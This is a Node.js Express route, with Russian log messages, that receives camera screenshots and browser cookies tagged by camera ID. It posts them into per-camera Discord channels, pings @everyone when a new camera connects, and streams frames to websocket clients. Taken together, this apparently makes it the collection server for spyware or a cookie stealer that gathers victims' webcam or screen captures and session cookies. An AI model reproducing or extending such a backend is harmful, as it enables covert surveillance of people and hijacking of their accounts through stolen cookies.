import express from "express";
import { GUILD_ID, CATEGORY_BASE_CAM, CATEGORY_ARCHIVE_CAM, CAM_INACTIVE_THRESHOLD, MAX_FILE_SIZE } from "../config.js";
import { bot } from "../discord/bot.js";
import { getOrCreateCategory, getOrCreateLogChannel, logToDiscord } from "../discord/channels.js";
import { safeChannelName, safeFileChunking } from "../utils/helpers.js";

const router = express.Router();
const channelByCam = global.channelByCam || (global.channelByCam = {});
const wsCameraClients = global.wsCameraClients || (global.wsCameraClients = {});
const camLastUpload = global.camLastUpload || (global.camLastUpload = {});

async function sendJsonFile(channel, nameBase, jsonData) {
    const str = JSON.stringify(jsonData, null, 2);
    if (Buffer.byteLength(str) <= MAX_FILE_SIZE) {
        await channel.send({ files: [{ attachment: Buffer.from(str), name: `${nameBase}.json` }] });
    } else {
        const chunks = safeFileChunking(str, MAX_FILE_SIZE);
        for (let i = 0; i < chunks.length; i++) {
            await channel.send({
                content: `📄 Файл ${nameBase} часть ${i + 1}/${chunks.length}`,
                files: [{ attachment: chunks[i], name: `${nameBase}-part${i + 1}.json` }]
            });
        }
    }
}

router.post("/", async (req, res) => {
    try {
        const { camId, screenshot, cookies } = req.body;
        if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });

        const guild = await bot.guilds.fetch(GUILD_ID);
        const isInactive = Date.now() - (camLastUpload[camId] || 0) > CAM_INACTIVE_THRESHOLD;
        const categoryName = isInactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_BASE_CAM;
        const category = await getOrCreateCategory(guild, categoryName);

        const channelName = safeChannelName('cam', camId);
        let finalChannel = null;
        let isNewCam = false;

        if (channelByCam[camId]) finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
        if (!finalChannel || finalChannel.parentId !== category.id) {
            finalChannel = await guild.channels.create({ name: channelName, type: 0, parent: category.id });
            channelByCam[camId] = finalChannel.id;
            isNewCam = true;
        }

        if (isNewCam) {
            const logChannel = await getOrCreateLogChannel(guild);
            await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
        }

        const buffer = Buffer.from(screenshot, "base64");
        if (buffer.length <= MAX_FILE_SIZE) {
            await finalChannel.send({ content: `📷 Новое изображение с камеры **${camId}** (${new Date().toLocaleTimeString()})`, files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
        }

        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);

        camLastUpload[camId] = Date.now();

        if (wsCameraClients[camId]) {
            wsCameraClients[camId].forEach(ws => { if (ws.readyState === 1) ws.send(JSON.stringify({ camId, screenshot })); });
        }

        res.json({ success: true });
    } catch (e) {
        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`);
        res.status(500).json({ error: e.message });
    }
});

export default router;
